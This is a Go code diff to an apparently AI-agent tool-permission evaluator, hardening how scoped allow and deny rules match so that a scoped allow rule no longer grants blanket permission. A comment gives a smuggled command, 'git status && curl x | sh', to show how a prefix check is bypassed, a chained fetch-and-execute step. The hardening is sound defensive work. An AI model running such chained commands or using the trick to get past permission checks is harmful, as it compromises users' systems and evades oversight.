@@ -85,7 +85,7 @@ type Request struct {
 // over every mode, including bypass.
 func Evaluate(ctx context.Context, req Request) Decision {
 	// Stage 1 — deny rules (absolute priority).
-	if matchRule(req.Ctx.Disallowed, req.ToolName) {
+	if matchRule(req.Ctx.Disallowed, req.ToolName, true) {
 		return Denied("denied: tool '" + req.ToolName + "' is disallowed by policy")
 	}
 	// A tool that hard-denies (e.g. failed self-validation) is also absolute.
@@ -105,7 +105,7 @@ func Evaluate(ctx context.Context, req Request) Decision {
 	}
 
 	// Stage 3 — allow rules and mode-based auto-allows.
-	if matchRule(req.Ctx.Allowed, req.ToolName) {
+	if matchRule(req.Ctx.Allowed, req.ToolName, false) {
 		return Allowed()
 	}
 	if req.Ctx.Mode == ModeAcceptEdits && editTools[req.ToolName] {
@@ -135,16 +135,29 @@ func Evaluate(ctx context.Context, req Request) Decision {
 	return Denied("denied: no approval handler configured for '" + req.ToolName + "'")
 }
 
-// matchRule reports whether toolName matches any rule. A rule is either a bare
-// tool name, "*" (any), or "Name(...)" whose Name part matches.
-func matchRule(rules []string, toolName string) bool {
+// matchRule reports whether toolName matches any rule. A rule is a bare tool
+// name, "*" (any), or the scoped form "Name(pattern)".
+//
+// The pattern of a scoped rule is not interpreted here (matching arguments safely
+// needs per-tool, shell-aware parsing: a prefix test is bypassed by
+// "git status && curl x | sh"), so the two lists treat it conservatively:
+//
+//   - deny lists (scoped=true): "Name(...)" denies the whole tool. Over-denying is
+//     the safe failure.
+//   - allow lists (scoped=false): "Name(...)" never auto-allows; the call falls
+//     through to the tool's own verdict and the approval callback.
+//
+// Only a bare name or "*" in the allow list grants blanket permission.
+func matchRule(rules []string, toolName string, deny bool) bool {
 	for _, r := range rules {
 		r = strings.TrimSpace(r)
 		if r == "*" || r == toolName {
 			return true
 		}
-		if i := strings.IndexByte(r, '('); i > 0 && r[:i] == toolName {
-			return true
+		if deny {
+			if i := strings.IndexByte(r, '('); i > 0 && r[:i] == toolName {
+				return true
+			}
 		}
 	}
 	return false
